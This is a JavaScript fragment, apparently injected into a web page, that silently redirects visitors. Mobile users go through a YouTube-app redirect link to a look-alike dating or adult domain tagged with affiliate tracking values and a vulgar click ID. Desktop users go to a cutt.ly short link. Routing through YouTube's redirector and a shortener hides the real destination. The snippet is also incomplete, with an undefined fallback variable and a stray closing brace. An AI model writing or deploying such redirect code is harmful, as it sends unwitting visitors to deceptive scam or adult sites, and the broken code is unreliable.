var app = "vnd.youtube://youtube.com/redirect?event=comments&redir_token=QUFFLUhqbVo1N0ZsYk1xVWRuWmctUWtmM1BwNzBfeEFCUXxBQ3Jtc0tudWhmQkdNSEtFMVJ6Wks3UTdYaFNsXy1zdjRLVWo4R1JBM2lPcEZkWnprb1NlRFBhMDNDM2pQcGNvQjdWWVB3TjBacFBfOWZQX256eGRzRVNvb0pFOFhjcXM3SDFTaE9LSjRYbUEwRElsWHZiWjdYdw&q=https%3A%2F%2Fmwwejq.datlngllfe.net%2F%3Futm_source%3Dda57dc555e50572d%26s1%3D181686%26s2%3D1854212%26click_id%3DHornny___fuck%26j1%3D1&html_redirect=1";

        var desktopFallback = "https://cutt.ly/pwqUQpCl";

        if (
          /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
            navigator.userAgent
          )
        ) {
          window.location.href = app;
          window.setTimeout(function () {
            window.location.href = mobileFallback;
          }, 25);
        } else {
          window.location.href = desktopFallback;
        }

        function killPopup() {
          window.removeEventListener("pagehide", killPopup);
        }

        window.addEventListener("pagehide", killPopup);
      }